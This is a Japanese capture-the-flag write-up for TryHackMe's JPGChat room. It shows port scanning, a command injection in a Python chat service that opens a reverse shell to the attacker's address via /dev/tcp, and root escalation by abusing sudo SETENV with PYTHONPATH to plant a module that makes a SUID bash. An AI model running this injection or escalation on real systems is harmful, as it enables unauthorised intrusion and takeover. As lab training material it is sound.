# JPGChat CTF

https://tryhackme.com/room/jpgchat

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.10.201
root@ip-10-10-53-199:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-10 03:17 BST
Nmap scan report for 10.10.10.201
Host is up (0.00038s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 02:52:E2:F9:1F:4D (Unknown)

root@ip-10-10-53-199:~# sudo nmap -A -p22,3000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-10 03:18 BST
Nmap scan report for 10.10.10.201
Host is up (0.00031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, NULL:
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=4/10%Time=67F72A81%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20
SF:service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAG
SF:E\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currentl
SF:y\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20
SF:report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gen
SF:ericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20t
SF:his\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\
SF:nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(c
SF:urrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x2
SF:0to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n"
SF:);
MAC Address: 02:52:E2:F9:1F:4D (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (99%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Linux 3.13 - 4.4 (92%), Linux 3.18 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 10.10.10.201

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
```

SSH と、3000 ポートに JPChat というサービス

```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

Github にソースコードがあると書かれている。

## Github

「Welcome to JPChat」をキーワードにして、Github のソースコードを発見した。  
https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py

```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

明らかにコマンドインジェクションの脆弱性がある。

## コマンドインジェクション

```shell
$ nc 10.10.10.201 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
hello;sh -i >& /dev/tcp/10.2.22.182/6666 0>&1;
your report:
aaa
hello
```

リバースシェル取得成功

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.10.201] 35830
sh: 0: can't access tty; job control turned off
$ id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
```

```shell
wes@ubuntu-xenial:/$ cat /home/wes/user.txt
JPC{48...............................}
```

ユーザーフラグゲット。

## 権限昇格

```shell
wes@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

sudo で環境変数をセットできる設定になっている。

```shell
wes@ubuntu-xenial:/$ ls -al /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15  2021 /opt/development/test_module.py

wes@ubuntu-xenial:/$ cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

compare をインポートし、Str メソッドを実行している。  
つまり、自作の compare モジュールを配置したディレクトリをパスに追加すると、任意のコードを実行できる。

```shell
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
```

bash をコピーして SUID を付けるコードを /tmp/compare.py として保存。

```shell
wes@ubuntu-xenial:/tmp$ cat /tmp/compare.py
import os

os.system('cp /bin/bash /tmp/rootbash')
os.system('chmod +s /tmp/rootbash')

class Str:
    def __init__(self, *args):
        pass
```

エクスプロイト

```shell
wes@ubuntu-xenial:/tmp$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py

Traceback (most recent call last):
  File "/opt/development/test_module.py", line 5, in <module>
    print(compare.Str('hello', 'hello', 'hello'))
NameError: name 'compare' is not defined
```

何かエラーが出たが、コピーと SUID 付与自体は成功していた。

```shell
wes@ubuntu-xenial:/tmp$ ls -al
total 1052
drwxrwxrwt  8 root root    4096 Apr 10 02:45 .
drwxr-xr-x 25 root root    4096 Apr 10 02:15 ..
-rw-r--r--  1 wes  wes      143 Apr 10 02:44 compare.py
drwxrwxrwt  2 root root    4096 Apr 10 02:15 .font-unix
drwxrwxrwt  2 root root    4096 Apr 10 02:15 .ICE-unix
drwxr-xr-x  2 root root    4096 Apr 10 02:45 __pycache__
-rwsr-sr-x  1 root root 1037528 Apr 10 02:46 rootbash
drwxrwxrwt  2 root root    4096 Apr 10 02:15 .Test-unix
drwxrwxrwt  2 root root    4096 Apr 10 02:15 .X11-unix
drwxrwxrwt  2 root root    4096 Apr 10 02:15 .XIM-unix
```

```shell
wes@ubuntu-xenial:/tmp$ ./rootbash -p
rootbash-4.3# id
uid=1001(wes) gid=1001(wes) euid=0(root) egid=0(root) groups=0(root),1001(wes)
```

root シェル取得成功。

```shell
rootbash-4.3# cat /root/root.txt
JPC{66...............................}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
```

ルートフラグゲット

## 振り返り

- 特に迷う要素もなく、ノーストレスで楽しめた。
- 仮に Github のヒントが無ければ、けっこう苦労したかもしれない。
- sudo に SETENV が設定されているのは初めてのパターン。
